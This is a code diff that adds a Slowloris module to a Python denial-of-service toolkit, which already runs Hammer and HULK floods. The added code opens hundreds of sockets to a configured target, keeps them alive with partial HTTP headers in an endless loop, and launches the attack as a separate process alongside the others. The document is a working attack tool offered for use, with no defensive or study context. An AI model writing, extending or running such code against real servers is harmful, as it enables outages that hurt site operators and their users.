@@ -3,6 +3,7 @@ import signal
 import atexit
 import socket
 import random
+import logging
 import time
 import os
 import multiprocessing as mp
@@ -25,6 +26,7 @@ class Config:
         self.HPING3 = False
         self.Hammer = True
         self.HULK = True
+        self.SlowLoris = True
 
         self.waitTime = 5  # seconds
         self.printColor = False
@@ -42,6 +44,11 @@ class Config:
         self.Hammer_PARAMETERS = {
             "threads": 50,
             "hits": 100,
+        }
+
+        self.SlowLoris_PARAMETERS = {
+            "socket_count": 500,
+            "sleeptime": 15
         }
 
         # ==============================================================================
@@ -212,6 +219,98 @@ def hulk():
 
 """
 -------------------------------------------------
+slowloris.py
+-------------------------------------------------
+"""
+
+def send_line(self, line):
+    line = f"{line}\r\n"
+    self.send(line.encode("utf-8"))
+
+def send_header(self, name, value):
+    self.send_line(f"{name}: {value}")
+
+list_of_sockets = []
+user_agents = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+
+setattr(socket.socket, "send_line", send_line)
+setattr(socket.socket, "send_header", send_header)
+
+def init_socket(ip: str):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+
+    s.connect((ip, config.ATKPort))
+
+    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+
+    ua = user_agents
+
+    s.send_header("User-Agent", ua)
+    s.send_header("Accept-language", "en-US,en,q=0.5")
+    return s
+
+def slowloris_iteration():
+    logging.info("Sending keep-alive headers...")
+    logging.info("Socket count: %s", len(list_of_sockets))
+
+    # Try to send a header line to each socket
+    for s in list(list_of_sockets):
+        try:
+            s.send_header("X-a", random.randint(1, 5000))
+        except socket.error:
+            list_of_sockets.remove(s)
+
+    # Some of the sockets may have been closed due to errors or timeouts.
+    # Re-create new sockets to replace them until we reach the desired number.
+
+    diff = config.SlowLoris_PARAMETERS["socket_count"] - len(list_of_sockets)
+    if diff <= 0:
+        return
+
+    logging.info("Creating %s new sockets...", diff)
+    for _ in range(diff):
+        try:
+            s = init_socket(config.ATKIPv4)
+            if not s:
+                continue
+            list_of_sockets.append(s)
+        except socket.error as e:
+            logging.debug("Failed to create new socket: %s", e)
+            break
+
+def slowloris():
+    # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ip = config.ATKIPv4
+    # port = config.ATKPort
+    socket_count = config.SlowLoris_PARAMETERS["socket_count"]
+    sleeptime = config.SlowLoris_PARAMETERS["sleeptime"]
+    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+
+    logging.info("Creating sockets...")
+    for _ in range(socket_count):
+        try:
+            logging.debug("Creating socket nr %s", _)
+            s = init_socket(ip)
+        except socket.error as e:
+            logging.debug(e)
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        try:
+            slowloris_iteration()
+        except (KeyboardInterrupt, SystemExit):
+            logging.info("Stopping Slowloris")
+            break
+        except Exception as e:
+            logging.debug("Error in Slowloris iteration: %s", e)
+        logging.debug("Sleeping for %d seconds", sleeptime)
+        time.sleep(sleeptime)
+
+
+"""
+-------------------------------------------------
 main.py
 -------------------------------------------------
 """
@@ -245,6 +344,10 @@ if __name__ == "__main__":
             p_hammer = mp.Process(target=hammering)
             p_hammer.start()
             processes += 1
+        if config.SlowLoris:
+            p_slowloris = mp.Process(target=slowloris)
+            p_slowloris.start()
+            processes += 1
         if processes == 0:
             if config.printColor:
                 print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
@@ -262,6 +365,8 @@ if __name__ == "__main__":
             p_hammer.terminate()
         if config.HULK:
             p_hulk.terminate()
+        if config.SlowLoris:
+            p_slowloris.terminate()
 
     if config.printColor:
         print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
